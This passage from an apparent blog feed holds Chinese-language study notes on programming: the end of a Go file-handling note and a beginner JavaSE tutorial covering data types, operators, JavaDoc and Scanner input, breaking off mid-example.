class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// createFile() // 重复创建文件会进行文件的覆盖</span></span><br><span class="line">	<span class="comment">// createDir()</span></span><br><span class="line">	<span class="comment">// removeFile()</span></span><br><span class="line">	<span class="comment">// getPwd()</span></span><br><span class="line">	<span class="comment">// rename()</span></span><br><span class="line">	<span class="comment">// readFile()</span></span><br><span class="line">	writeFile()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="跨包调用文件">1.12. 跨包调用文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go mod init sa(可替换其他包名) --&gt; go.mod 会生成一个 moudle sa, sa为其他目录调用的主模块</span><br><span class="line">sa/Plugins(文件的package_name)</span><br><span class="line"></span><br><span class="line">公开调用的函数名，必须是开头字母大写</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230118142144960.png" alt="image-20230118142144960"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230118142124626.png" alt="image-20230118142124626"></p>
]]></content>
      <categories>
        <category>高级语言</category>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>JavaSE</title>
    <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Java/JavaSE.html</url>
    <content><![CDATA[<h1 id="JavaSE">1. JavaSE</h1><p>配套学习视频</p>
<h2 id="基础">1.1. 基础</h2><h3 id="1、主函数创建及固定格式">1.1.1. 1、主函数创建及固定格式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello word!&quot;</span>); <span class="comment">// println为输出后换行,且输出字符串内容必须用双引号包围，不能用单引号</span></span><br><span class="line">        System.out.println(<span class="string">&quot;my first java&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;hello word!&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;my first java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">javac hello.java</span></span><br><span class="line"><span class="comment">如果报错:</span></span><br><span class="line"><span class="comment">javac 错误: 编码GBK的不可映射字符</span></span><br><span class="line"><span class="comment">则使用 javac -encoding utf-8 hello.java</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">java hello</span></span><br><span class="line"><span class="comment">如果报错：</span></span><br><span class="line"><span class="comment">无法找到主类</span></span><br><span class="line"><span class="comment">把package什么的都去掉再javac编译一次</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221023224438045.png" alt="image-20221023224438045"></p>
<h3 id="2、Java注释">1.1.2. 2、Java注释</h3><ul>
<li>单行注释	&#x2F;&#x2F; </li>
<li>多行注释    &#x2F;* *&#x2F;</li>
<li>JavaDoc     &#x2F;**  *&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x2F;**回车即可生成</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">zhushi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 单行注释</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 多行注释 /* */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        qwer</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// JavaDoc /**  */</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@description</span> Hello word</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@author</span> qiwentaidi</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3、标识符">1.1.3. 3、标识符</h3><ul>
<li>标识符只能以	下划线_|	大写字母[A-Z]	|	小写字母[a-z]	|	美元符号$	开头</li>
<li>不能使用关键字作为变量名或方法名</li>
<li>标识符大小写敏感</li>
</ul>
<h3 id="4、数据类型">1.1.4. 4、数据类型</h3><ul>
<li><p>Java是强类型语言，所有变量都需要先定义再使用</p>
</li>
<li><p>八大基本类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sjlx</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 八大基本数据类型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 整数</span></span><br><span class="line">        <span class="type">byte</span> <span class="variable">num1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">short</span> <span class="variable">num3</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">num4</span> <span class="operator">=</span> <span class="number">40L</span>; <span class="comment">// long类型在数字后面加L</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 小数</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">num5</span> <span class="operator">=</span> <span class="number">50.1F</span>; <span class="comment">// float类型在小数后面加L</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">num6</span> <span class="operator">=</span> <span class="number">3.1415926</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字符</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&#x27;王&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 布尔值</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>整数拓展</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sjlx</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 整数拓展: 进制 二进制0b   八进制0    十进制     十六进制0x</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">0b10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">010</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0x10</span>;	<span class="comment">// 十六进制0x A~F 0~9</span></span><br><span class="line">        System.out.println(i1);</span><br><span class="line">        System.out.println(i2);</span><br><span class="line">        System.out.println(i3);</span><br><span class="line">        System.out.println(i4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221025101309019.png" alt="image-20221025101309019"></p>
</li>
<li><p>浮点数拓展</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sjlx</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 浮点数拓展</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0.1F</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">0.1</span>*<span class="number">10</span>;</span><br><span class="line">        <span class="type">float</span> <span class="variable">f</span> <span class="operator">=</span> <span class="number">0.1F</span>*<span class="number">10</span>;</span><br><span class="line">        <span class="comment">// float    有限  离散  舍入误差    大约  接近但不等于</span></span><br><span class="line">        <span class="comment">// double</span></span><br><span class="line">        <span class="comment">// 最好完全避免使用浮点数进行比较</span></span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(d);</span><br><span class="line">        System.out.println(f);</span><br><span class="line">        System.out.println(b==d);   <span class="comment">// false</span></span><br><span class="line">        System.out.println(b==f);   <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">        <span class="type">float</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="number">1231231231231F</span>;</span><br><span class="line">        <span class="type">float</span> <span class="variable">d2</span> <span class="operator">=</span> d1+<span class="number">1</span>;</span><br><span class="line">        System.out.println(d1==d2); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221025103323785.png" alt="image-20221025103323785"></p>
</li>
<li><p>字符拓展</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sjlx</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 字符拓展</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="type">char</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&#x27;中&#x27;</span>;</span><br><span class="line">        <span class="comment">// (int) 强制转化类型 输出unicode编码数值</span></span><br><span class="line">        System.out.println(s1);</span><br><span class="line">        System.out.println((<span class="type">int</span>)s1);</span><br><span class="line">        System.out.println(s2);</span><br><span class="line">        System.out.println((<span class="type">int</span>)s2);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// U0000 UFFFF</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="string">&#x27;\u0061&#x27;</span></span><br><span class="line">        System.out.println(c3); <span class="comment">// a</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221025103302711.png" alt="image-20221025103302711"></p>
</li>
<li><p>转义字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\t 制表符</span><br><span class="line">\n 换行</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>引用类型</p>
<ul>
<li>类</li>
<li>接口</li>
<li>数组</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5、类型转换">1.1.5. 5、类型转换</h3><ul>
<li>强行转换<ul>
<li>注意事项<ul>
<li>内存溢出</li>
<li>精度偏差</li>
</ul>
</li>
</ul>
</li>
<li>自动转换</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lxzh</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> (<span class="type">byte</span>)i; <span class="comment">// 内存溢出</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 强制转换     类型（变量名）高-低</span></span><br><span class="line">        <span class="comment">// 自动转换     低-高</span></span><br><span class="line">        System.out.println(i);</span><br><span class="line">        System.out.println(b);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">        <span class="type">float</span> <span class="variable">b1</span> <span class="operator">=</span> i1;</span><br><span class="line">        System.out.println(b1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221025161037916.png" alt="image-20221025161037916"></p>
<h3 id="6、变量、常量、作用域">1.1.6. 6、变量、常量、作用域</h3><ul>
<li><p>作用域</p>
<ul>
<li>类变量<ul>
<li>需要加上static、修饰符不区分前后final是修饰符</li>
</ul>
</li>
<li>实例变量<ul>
<li>从属于对象，定义在方法外类内，调用实例变量需要实例化对象，如果没有赋值时调用则用类型的默认值</li>
</ul>
</li>
<li>局部变量<ul>
<li>定义再方法里面的变量</li>
</ul>
</li>
<li>常量<ul>
<li>固定值的变量加final为常量，常量名一般为大写</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bl</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Double</span> <span class="variable">PI</span> <span class="operator">=</span> <span class="number">3.14</span>; <span class="comment">// 常量</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> i; <span class="comment">// 类变量</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>; <span class="comment">// 实例变量,从属于对象，如果没有赋值时调用则用类型的默认值</span></span><br><span class="line">    <span class="comment">// 布尔默认为false</span></span><br><span class="line">    <span class="comment">// 除了基本类型其余默认值都为null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(i=<span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 调用实例变量需要实例化对象</span></span><br><span class="line">        <span class="type">bl</span> <span class="variable">bl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">bl</span>();</span><br><span class="line">        bl.name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">        System.out.println(bl.name);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// 局部变量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221025223350216.png" alt="image-20221025223350216"></p>
</li>
</ul>
<h4 id="6-1、命名规范">1.1.6.1. 6.1、命名规范</h4><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221025224014167.png" alt="image-20221025224014167"></p>
<h3 id="7、基本运算符">1.1.7. 7、基本运算符</h3><ul>
<li><p><strong>算术运算符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+，-，*，/，%，++，--</span><br><span class="line">++a 先自增1，再运算</span><br><span class="line">a++ 先运算，再自增1</span><br><span class="line">--a</span><br><span class="line">a-- 同理</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">40</span>;</span><br><span class="line">        <span class="type">short</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">80</span>;</span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">        System.out.println(a-b);</span><br><span class="line">        System.out.println(a*b);</span><br><span class="line">        System.out.println(a/b);    <span class="comment">// 两个整数运算会取整</span></span><br><span class="line">        System.out.println(a/(<span class="type">double</span>)b);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">e</span> <span class="operator">=</span> <span class="number">123213123123L</span>;</span><br><span class="line">        <span class="comment">// 多个类型的数值进行计算自动升型为其中最高类型，小于int的都为int</span></span><br><span class="line">        System.out.println(a+b+c+d+e);  <span class="comment">// Long</span></span><br><span class="line">        System.out.println(c+d);    <span class="comment">// Int</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026210229785.png" alt="image-20221026210229785"></p>
<ul>
<li><p><strong>Math类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 幂运算，2的3次方</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">pow</span> <span class="operator">=</span> Math.pow(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">        System.out.println(pow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026212122442.png" alt="image-20221026212122442"></p>
</li>
</ul>
</li>
<li><p><strong>赋值运算符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>关系运算符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;,&lt;,&gt;=,&lt;=,==,!=instanceof	只会返回true或者false</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>逻辑运算符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;,||,!</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">a</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;a &amp;&amp; b: &quot;</span> + (a&amp;&amp;b));     <span class="comment">// 与    两个都为真才为真</span></span><br><span class="line">        System.out.println(<span class="string">&quot;a || b: &quot;</span> + (a||b));     <span class="comment">// 或    其中一个为真则为真</span></span><br><span class="line">        System.out.println(<span class="string">&quot;!(a &amp;&amp; b): &quot;</span> + !(a&amp;&amp;b)); <span class="comment">// 非    取反</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 短路运算</span></span><br><span class="line">        System.out.println(b&amp;&amp;a);   <span class="comment">// 因为b为false所以不用计算&amp;&amp;a也能得出b&amp;&amp;a为false所以后续&amp;&amp;a不会被执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026215413767.png" alt="image-20221026215413767"></p>
</li>
<li><p>位运算符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;,|,^（异或）,~（取反）,&gt;&gt;,&lt;&lt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * A = 0011 1100</span></span><br><span class="line"><span class="comment">        * B = 0000 1101</span></span><br><span class="line"><span class="comment">        * -------------------------</span></span><br><span class="line"><span class="comment">        * A&amp;B = 0000 1100</span></span><br><span class="line"><span class="comment">        * A|B = 0011 1101</span></span><br><span class="line"><span class="comment">        * A^B = 0011 0001   // 异或，如果相同则为0，否则为1</span></span><br><span class="line"><span class="comment">        * ~B = 1111 0010    //取反</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">2</span>*<span class="number">8</span>;    <span class="comment">// a=16</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">2</span>&lt;&lt;<span class="number">3</span>;   <span class="comment">// &lt;&lt; 位数向左移 原本:0000 0010   &lt;&lt;3     后:0001 0000  此方法相率高</span></span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>条件运算符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?:</span><br></pre></td></tr></table></figure>
</li>
<li><p>扩展赋值运算符和<strong>三元运算符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+=,-=,*=,/=</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        a+=b;   <span class="comment">// a=a+b</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        a-=b;   <span class="comment">// a=a-b</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">// 字符串连接符 +</span></span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>+a+b); <span class="comment">// 都会转为String类型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          三元运算符</span></span><br><span class="line"><span class="comment">          =======================================</span></span><br><span class="line"><span class="comment">          x ? y : z    ==》  if(x):&#123;y&#125;    else&#123;z&#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> <span class="number">60</span>;</span><br><span class="line">        String s= score&lt;<span class="number">60</span> ? <span class="string">&quot;不及格&quot;</span>:<span class="string">&quot;及格&quot;</span>;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026222309936.png" alt="image-20221026222309936"></p>
<h3 id="8、包机制">1.1.8. 8、包机制</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">包 = 文件夹</span><br><span class="line">为了能够使用某个包中的成员，需要在程序最顶端使用import导入包，无法调用重名文件</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026223945970.png" alt="image-20221026223945970"></p>
<h3 id="9、JavaDoc生成文档">1.1.9. 9、JavaDoc生成文档</h3><ul>
<li><p>JavaDoc命令是用来生成自己的API文档</p>
<ul>
<li><p>参数介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@author		作者名</span><br><span class="line">@version	版本号</span><br><span class="line">@since		指明最早需要使用的JDK版本</span><br><span class="line">@param		参数名</span><br><span class="line">@return		返回值情况</span><br><span class="line">@throws		异常抛出情况</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>JavaDoc放在类上为类注释，放在方法上叫方法注释</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> qiwentaidi</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.8</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Doc</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">func</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>生成JavaDoc文档</p>
<ul>
<li><p>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在java文件目录下,Doc.java替换成需要生成的文件</span><br><span class="line">javadoc -encoding UTF-8 -charset UTF-8 Doc.java</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221027201717171.png" alt="image-20221027201717171"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221027201731582.png" alt="image-20221027201731582"></p>
</li>
</ul>
</li>
</ul>
<h2 id="流程控制">1.2. 流程控制</h2><h3 id="1、用户交互Scanner">1.2.1. 1、用户交互Scanner</h3><ul>
<li><p>通过Scanner获取用户的输入</p>
<ul>
<li><p>next()与nextline()方法获得输入的字符串</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221027213323532.png" alt="image-20221027213323532"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221027212956418.png" alt="image-20221027212956418"></p>
</li>
<li><p>在读取前可使用hasNext()与hasNextLine()判断用户是否输入的数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">float</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0.0F</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入整数&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNextInt())&#123;</span><br><span class="line">            i = scanner.nextInt();</span><br><span class="line">            System.out.println(<span class="string">&quot;你输入的是整数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;你输入的不是整数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入小数&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNextFloat())&#123;</span><br><span class="line">            j = scanner.nextFloat();</span><br><span class="line">            System.out.print(<span class="string">&quot;你输入的是小数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;你输入的不是小数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 